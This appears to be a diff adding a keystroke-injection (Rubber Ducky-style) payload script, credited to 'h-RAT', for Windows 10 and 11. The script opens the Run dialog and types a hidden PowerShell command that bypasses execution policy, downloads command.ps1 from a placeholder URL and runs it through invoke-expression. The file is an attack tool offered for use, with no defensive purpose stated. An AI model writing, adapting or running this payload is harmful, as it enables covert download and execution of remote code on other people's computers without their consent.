@@ -1,0 +1,16 @@
+REM     Title: Execute .EXE
+
+REM     Author: h-RAT
+
+REM     Description: This payload execute a remote file.
+
+REM     Target: Windows 10, 11
+
+REM     --------------------------------------------------------------------------------------
+REM     THIS PAYLOAD IS NOT PLUG AND PLAY. YOU NEED TO MODIFY THE COMMAND.PS1 FILE AND THIS FILE.
+REM     --------------------------------------------------------------------------------------
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr http://YOUR_URL/command.ps1; invoke-expression $pl
+ENTER
